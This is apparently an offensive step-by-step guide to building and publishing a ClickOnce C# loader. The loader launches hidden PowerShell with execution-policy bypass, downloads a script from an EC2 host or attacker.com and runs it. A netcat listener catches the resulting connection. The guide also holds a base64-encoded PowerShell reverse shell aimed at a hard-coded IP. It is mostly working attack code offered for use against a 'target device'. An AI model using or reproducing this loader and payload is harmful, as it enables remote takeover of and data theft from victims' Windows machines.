## 1. Create lscript.application

1. Go to Visual Studio Community edition to create the loader.
2. Create a C# Console application for Windows
3. In lscript.cs, write the following code ->

```
using System.Diagnostics;

static class Program {
    [System.STAThread]
    static void Main() {
        string encoded = "<Base64_Download_Command>";
        string psArgs = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}";
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
```

4. Change the Uri to the EC2 instance with the **perfect.ps1** script. Run the below command in Mac/Linux,

```
echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'perfect.ps1'" | iconv -t UTF-16LE | base64 -w 0
```
5. Replace the above Base64 output to <Base64_Download_Command> on the lscript.cs file.
6. You have to host the perfect.ps1, go to https://www.revshells.com, change the reverse shell IP to the public IP and port as 9999.
7. Create a Powershell base64 payload, copy and save it in the EC2 instance.
8. Open port 9999 from the security group for the public IP.

## 2. Publishing the exploit

1. Go to Visual Studio on the Windows machine.
2. Right click, choose **Properties**, then **Security**, Enable **ClickOnce Security Settings, This is a full trust application**.
3. This application is available offline and startable from Start Menu, click **Publish**.

## 3. Exploitation

1. Run **sudo python -m http.server 9999**
2. Go to your EC2 Instance, make sure there is an inbound rule entry in the security groups for port 9999 for only the public IP of the target device that will be used.
3. Start the listener with ```nc -lnvp 9999```
4. Execute the _lscript.application_ file on the target device.
5. Check the listener.


```
# Unencoded lscript.cs file

using System.Diagnostics;

static class Program {
    [System.STAThread] // (Use STA if a GUI/WinForms app; not needed for pure console)
    static void Main() {
        // Prepare PowerShell command (e.g., reverse shell or arbitrary script)
        string psArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
                      + "-Command \"Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -OutFile 'payload.ps1'; "
                      + "powershell -ExecutionPolicy Bypass -File 'payload.ps1'\"";
        // Configure process start info to launch PowerShell
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,   // no new window for PowerShell
            UseShellExecute = false  // required for CreateNoWindow
        };
        Process.Start(psi);
    }
}
```
```
JHNzbFByb3RvY29scyA9IFtTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24uU3NsUHJvdG9jb2xzXTo6VGxzMTI7ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgnNTQuNzguODYuMTInLCA5OTk5KTskTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7JFNzbFN0cmVhbSA9IE5ldy1PYmplY3QgTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkTmV0d29ya1N0cmVhbSwkZmFsc2UsKHskdHJ1ZX0gLWFzIFtOZXQuU2VjdXJpdHkuUmVtb3RlQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2tdKSk7JFNzbFN0cmVhbS5BdXRoZW50aWNhdGVBc0NsaWVudCgnY2xvdWRmbGFyZS1kbnMuY29tJywkbnVsbCwkc3NsUHJvdG9jb2xzLCRmYWxzZSk7aWYoISRTc2xTdHJlYW0uSXNFbmNyeXB0ZWQgLW9yICEkU3NsU3RyZWFtLklzU2lnbmVkKSB7JFNzbFN0cmVhbS5DbG9zZSgpO2V4aXR9JFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCRTc2xTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDQwOTYgOyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfTtXcml0ZVRvU3RyZWFtICcnO3doaWxlKCgkQnl0ZXNSZWFkID0gJFNzbFN0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgp
